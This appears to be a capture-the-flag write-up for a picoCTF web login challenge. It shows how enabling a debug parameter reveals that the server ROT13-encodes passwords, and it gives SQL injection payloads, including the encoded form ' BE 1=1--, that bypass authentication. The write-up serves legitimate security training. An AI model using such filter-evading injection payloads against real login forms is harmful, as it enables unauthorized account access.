## Description:
> There is a secure website running at https://2019shell1.picoctf.com/problem/21874/ (link) or http://2019shell1.picoctf.com:21874. Try to see if you can login as admin!

## Hint:
> Seems like the password is encrypted.

## Solving:

The admin log in page doesn't seem to like a simple SQLi so I tried the password 'admin123' and looked at the network monitor. In the request body we get ```password=admin123&debug=0```. If we change debug to ```1``` we can see what is happening:

```php
password: admin123
SQL query: SELECT * FROM admin where password = 'nqzva123'
```
The server is substituting letters so if we try again with a ```' OR 1=1--'``` SQLi we can see what the subsitution is doing by changing the parameters to resend as ```password=%27+OR+1%3D1--&debug=1``` in the network monitor, the response:
```php
password: ' OR 1=1--
SQL query: SELECT * FROM admin where password = '' BE 1=1--'
```
The ```OR``` is substituted by ```BE```. So if we input a SQLi as ```' BE 1=1--``` we should be able to bypass the password field.
